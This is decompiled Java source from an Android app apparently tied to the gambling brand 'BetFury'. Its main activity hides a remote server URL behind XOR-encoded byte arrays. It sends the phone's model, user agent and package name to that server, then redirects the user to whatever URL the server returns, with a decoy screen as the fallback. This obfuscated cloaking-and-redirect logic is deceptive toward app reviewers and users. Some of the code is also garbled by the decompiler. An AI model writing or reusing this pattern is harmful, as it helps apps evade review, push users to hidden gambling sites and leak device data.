package com.trembin.nirefon.betfury;

import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.webkit.WebSettings;
import com.trembin.nirefon.betfury.MainActivity;
import com.trembin.nirefon.betfury.databinding.ActivityMainBinding;
import defpackage.ah0;
import defpackage.fb;
import defpackage.hm0;
import defpackage.hn;
import defpackage.i5;
import defpackage.ir;
import defpackage.j90;
import defpackage.k70;
import defpackage.kl;
import defpackage.ll;
import defpackage.mf0;
import defpackage.ml;
import defpackage.mv;
import defpackage.n40;
import defpackage.n70;
import defpackage.n9;
import defpackage.nl;
import defpackage.nu;
import defpackage.o40;
import defpackage.ol;
import defpackage.ou;
import defpackage.pl;
import defpackage.q50;
import defpackage.ql;
import defpackage.rg;
import defpackage.rl;
import defpackage.s9;
import defpackage.u3;
import defpackage.uc;
import defpackage.uf0;
import defpackage.wg0;
import defpackage.wi;
import defpackage.zl0;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.WeakHashMap;

/* compiled from: r8-map-id-555d5e190d9a27a9a8404de93c25a29c9fbe11559b3463c92c68ce527c1de619 */
/* loaded from: classes.dex */
public final class MainActivity extends u3 {
    public static final /* synthetic */ int K = 0;
    public final wg0 F;
    public String G;
    public final String H = l(new byte[]{-32, 96, -28});
    public final String I = l(new byte[]{-15, 115, -15, 106});
    public final wg0 J;

    /* JADX WARN: Failed to restore enum class, 'enum' modifier and super class removed */
    /* JADX WARN: Unknown enum class pattern. Please report as an issue! */
    /* compiled from: r8-map-id-555d5e190d9a27a9a8404de93c25a29c9fbe11559b3463c92c68ce527c1de619 */
    public static final class a {
        private static final /* synthetic */ hn $ENTRIES;
        private static final /* synthetic */ a[] $VALUES;
        public static final a INIT = new a("INIT", 0);
        public static final a FETCH = new a("FETCH", 1);
        public static final a READY = new a("READY", 2);

        private static final /* synthetic */ a[] $values() {
            return new a[]{INIT, FETCH, READY};
        }

        static {
            a[] $values = $values();
            $VALUES = $values;
            $ENTRIES = n9.k($values);
        }

        private a(String str, int i) {
        }

        public static hn getEntries() {
            return $ENTRIES;
        }

        public static a valueOf(String str) {
            return (a) Enum.valueOf(a.class, str);
        }

        public static a[] values() {
            return (a[]) $VALUES.clone();
        }
    }

    public MainActivity() {
        final int i = 0;
        this.F = new wg0(new ir(this) { // from class: hz
            public final /* synthetic */ MainActivity g;

            {
                this.g = this;
            }

            @Override // defpackage.ir
            public final Object a() {
                int i2 = i;
                MainActivity mainActivity = this.g;
                switch (i2) {
                    case 0:
                        int i3 = MainActivity.K;
                        return ActivityMainBinding.inflate(mainActivity.getLayoutInflater());
                    default:
                        return mainActivity.getSharedPreferences(mainActivity.H, 0);
                }
            }
        });
        final int i2 = 1;
        this.J = new wg0(new ir(this) { // from class: hz
            public final /* synthetic */ MainActivity g;

            {
                this.g = this;
            }

            @Override // defpackage.ir
            public final Object a() {
                int i22 = i2;
                MainActivity mainActivity = this.g;
                switch (i22) {
                    case 0:
                        int i3 = MainActivity.K;
                        return ActivityMainBinding.inflate(mainActivity.getLayoutInflater());
                    default:
                        return mainActivity.getSharedPreferences(mainActivity.H, 0);
                }
            }
        });
    }

    public static String l(byte[] bArr) {
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        while (i < length) {
            int i3 = i2 + 1;
            arrayList.add(Byte.valueOf((byte) ((i2 % 2 == 0 ? 131 : 6) ^ (bArr[i] & 255))));
            i++;
            i2 = i3;
        }
        return new String(uc.o0(arrayList), fb.a);
    }

    public final void m() {
        startActivity(new Intent(this, (Class<?>) MainActivity2.class));
    }

    public final void n(String str) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            m();
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:60:0x0246, code lost:
    
        r3 = r2;
     */
    @Override // androidx.fragment.app.b, defpackage.yd, defpackage.xd, android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onCreate(Bundle bundle) {
        k70 k70Var;
        super.onCreate(bundle);
        char c = 2;
        ah0 ah0Var = new ah0(0, 0, new rg(2));
        ah0 ah0Var2 = new ah0(ml.a, ml.b, new rg(2));
        View decorView = getWindow().getDecorView();
        decorView.getClass();
        nl nlVar = ml.c;
        if (nlVar == null) {
            int i = Build.VERSION.SDK_INT;
            nlVar = i >= 35 ? new rl() : i >= 30 ? new ql() : i >= 29 ? new pl() : i >= 28 ? new ol() : new nl();
            ml.c = nlVar;
        }
        nl nlVar2 = nlVar;
        kl klVar = new kl(nlVar2, ah0Var, ah0Var2, this, decorView);
        ViewGroup viewGroup = (ViewGroup) decorView;
        int i2 = 0;
        while (true) {
            if (i2 >= viewGroup.getChildCount()) {
                ll llVar = new ll(klVar, viewGroup.getContext());
                llVar.setTag(nlVar2);
                llVar.setVisibility(8);
                llVar.setWillNotDraw(true);
                viewGroup.addView(llVar);
                break;
            }
            int i3 = i2 + 1;
            View childAt = viewGroup.getChildAt(i2);
            if (childAt == null) {
                throw new IndexOutOfBoundsException();
            }
            if (childAt.getTag() instanceof nl) {
                break;
            } else {
                i2 = i3;
            }
        }
        klVar.run();
        Window window = getWindow();
        window.getClass();
        nlVar2.a(window);
        if (a.INIT != null) {
            setContentView(((ActivityMainBinding) this.F.getValue()).getRoot());
        }
        View findViewById = findViewById(R.id.main);
        s9 s9Var = new s9(15);
        WeakHashMap weakHashMap = hm0.a;
        zl0.c(findViewById, s9Var);
        getWindow().setFlags(1024, 1024);
        k70 k70Var2 = null;
        String string = ((SharedPreferences) this.J.getValue()).getString(this.I, null);
        if (string != null && !mf0.y(string)) {
            this.G = string;
            n(string);
            return;
        }
        String packageName = getPackageName();
        String l = l(new byte[]{-15, 115, -15, 106});
        String l2 = l(new byte[]{-68, 103, -13, 118, -66});
        getPackageName().getClass();
        byte[] bArr = {-21, 114, -9, 118, -16, 60, -84, 41, -16, 110, -6, 43, -21, 111, -17, 106, -82, 98, -25, 96, -69, 40, -22, Byte.MAX_VALUE, -6, 103, -15, 101, -21, 111, -24, 54, -77, 118, -17, 126, -19, 49, -79, 40, -12, 105, -15, 109, -26, 116, -16, 40, -25, 99, -11};
        ArrayList arrayList = new ArrayList(51);
        int i4 = 0;
        int i5 = 0;
        while (i4 < 51) {
            char c2 = c;
            int i6 = i5 + 1;
            arrayList.add(Byte.valueOf((byte) ((bArr[i4] & 255) ^ (i5 % 2 == 0 ? 131 : 6))));
            i4++;
            c = c2;
            i5 = i6;
        }
        String str = new String(uc.o0(arrayList), fb.a) + l2 + packageName;
        o40 o40Var = new o40(new n40());
        wi wiVar = new wi(5);
        if (uf0.r(str, "ws:", true)) {
            str = "http:".concat(str.substring(3));
        } else if (uf0.r(str, "wss:", true)) {
            str = "https:".concat(str.substring(4));
        }
        nu nuVar = new nu(0);
        nuVar.f(null, str);
        wiVar.f = nuVar.b();
        String l3 = l(new byte[]{-37, 43, -57, 99, -11, 111, -32, 99, -82, 75, -20, 98, -26, 106});
        String str2 = Build.MODEL;
        str2.getClass();
        wiVar.k(l3, str2);
        wiVar.k(l(new byte[]{-62, 101, -32, 99, -13, 114, -82, 74, -30, 104, -28, 115, -30, 97, -26}), l(new byte[]{-26, 104, -82, 83, -48, 42, -26, 104, -72, 119, -66, 54, -83, 63}));
        String l4 = l(new byte[]{-42, 117, -26, 116, -82, 71, -28, 99, -19, 114});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        defaultUserAgent.getClass();
        wiVar.k(l4, defaultUserAgent);
        j90 c3 = wiVar.c();
        n70 n70Var = new n70(o40Var, c3);
        i5 i5Var = new i5((LayoutInflater.Factory2) this, (Object) l, 22);
        if (!n70Var.j.compareAndSet(false, true)) {
            s9.u("Already Executed");
            return;
        }
        q50 q50Var = q50.a;
        n70Var.k = q50.a.g();
        wi wiVar2 = o40Var.f;
        k70 k70Var3 = new k70(n70Var, i5Var);
        wiVar2.getClass();
        synchronized (wiVar2) {
            ((ArrayDeque) wiVar2.g).add(k70Var3);
            String str3 = ((ou) c3.b).d;
            Iterator it = ((ArrayDeque) wiVar2.h).iterator();
            while (true) {
                if (it.hasNext()) {
                    k70Var = (k70) it.next();
                    if (mv.c(((ou) k70Var.h.g.b).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) wiVar2.g).iterator();
                    while (it2.hasNext()) {
                        k70Var = (k70) it2.next();
                        if (mv.c(((ou) k70Var.h.g.b).d, str3)) {
                        }
                    }
                }
            }
            if (k70Var2 != null) {
                k70Var3.g = k70Var2.g;
            }
        }
        wiVar2.q();
    }

    @Override // androidx.fragment.app.b, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.G;
        if (str != null) {
            n(str);
        }
    }
}
